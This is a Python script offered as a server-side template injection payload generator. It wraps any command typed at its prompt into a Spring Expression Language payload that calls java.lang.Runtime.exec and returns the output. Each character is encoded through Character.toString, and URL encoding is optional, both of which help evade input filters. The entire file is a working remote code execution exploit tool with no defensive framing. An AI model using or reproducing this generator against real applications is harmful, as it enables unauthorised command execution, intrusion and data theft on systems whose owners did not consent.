#!/usr/bin/python3
from cmd import Cmd
import urllib.parse, argparse

parser = argparse.ArgumentParser(description="Generate SSTI payloads... One character at a time.")
parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
args = parser.parse_args()

url_encode=args.url_encode

class Terminal(Cmd):
	prompt='\033[1;33mCommand ==>\033[0m '
	def decimal_encode(self,args):
		command=args

		decimals=[]

		for i in command:
			decimals.append(str(ord(i)))

		payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
		

		for i in decimals[1:]:
			line='.concat(T(java.lang.Character).toString({}))'.format(i)
			payload+=line

		payload+=').getInputStream())}'
		if url_encode:
			payload_encoded=urllib.parse.quote_plus(payload,safe='')
			return payload_encoded
		else:
			return payload

	def default(self,args):
		print(self.decimal_encode(args))
		print()
try:
	term=Terminal()
	term.cmdloop()
except KeyboardInterrupt:
	quit()
